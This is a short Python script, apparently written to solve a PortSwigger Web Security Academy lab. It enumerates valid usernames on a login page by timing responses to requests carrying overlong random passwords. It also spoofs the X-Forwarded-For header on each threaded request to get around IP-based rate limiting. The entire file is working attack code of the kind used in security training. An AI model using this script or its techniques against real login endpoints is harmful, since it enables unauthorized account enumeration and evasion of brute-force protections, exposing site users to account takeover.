import requests
from threading import Thread
from time import sleep, time
from string import ascii_lowercase
import random

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())
    return listUsername

def sendRequest(url, cookie, username, header):
    randomPassword = ''.join(random.choices(ascii_lowercase, k=699))
    loginData = {
        'username': username,
        'password': randomPassword
    }
    startTime = time()
    requests.post(url, cookies=cookie, data=loginData, headers=header)
    endTime = time()
    if endTime - startTime >= 3:
        print(f'[+] Found user: {username}')

def main():
    url = 'https://0adc0058041e6a9f81ce4f4b00e20077.web-security-academy.net/login'
    cookie = {'session': 'IFDRDTNZvi7uLZoYZgRD6SQ0F9QLxpcf'}

    userFileName = './username.txt'
    listUsername = fetchUsername(userFileName)
    count = 0
    for username in listUsername:
        count += 1
        header = {'X-Forwarded-For': '1.1.1.' + str(count)}
        thread = Thread(target=sendRequest, args=(url, cookie, username, header))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()